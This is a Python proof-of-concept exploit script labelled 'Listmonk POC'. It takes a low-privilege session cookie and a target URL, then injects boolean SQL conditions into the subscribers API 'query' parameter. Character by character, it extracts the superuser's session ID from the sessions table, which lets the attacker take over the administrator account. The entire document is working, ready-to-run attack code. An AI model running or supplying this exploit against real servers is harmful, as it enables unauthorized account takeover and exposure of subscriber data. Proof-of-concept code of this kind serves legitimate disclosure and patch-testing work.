#!/usr/bin/env python3

import requests
import argparse
import string
import json
from urllib.parse import urlencode

def get_superuser_sid(session_cookie, base_url):
    endpoint = f"{base_url}/api/subscribers"
    headers = {
        "Cookie": f"session={session_cookie}",
    }

    sid = ""
    pos = 1
    dictionary = list(string.ascii_lowercase + string.ascii_uppercase + '0123456789')

    while len(sid) < 64:
        for guess in dictionary:
            params = {
                "list_id": "",
                "query": f"(SELECT SUBSTRING(id, {pos}, 1) FROM sessions WHERE data->>'user_id'='1') = '{guess}'",
                "page": "1",
                "subscription_status": "",
                "order_by": "id",
                "order": "desc"
            }

            response = requests.get(endpoint, params=params, headers=headers).json()
            if 'message' in response:
                raise Exception(json.dumps(response))
            good = bool(len(response['data']['results']))
            if good:
                sid += guess
                print(f"Got chararcter at position {pos}: {guess}")
                pos += 1
                break
    return sid


def main():
    parser = argparse.ArgumentParser(
        description='Listmonk POC',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument('session_cookie',
                       help='Session cookie value of an account with get-all subscribers role')

    parser.add_argument('base_url',
                       help='Base URL of the Listmonk service')

    args = parser.parse_args()

    try:
        sid = get_superuser_sid(args.session_cookie, args.base_url)
        print(f"Found SID: {sid}")
    except Exception as e:
        print(f"There was a problem: {e}")

if __name__ == '__main__':
    main()
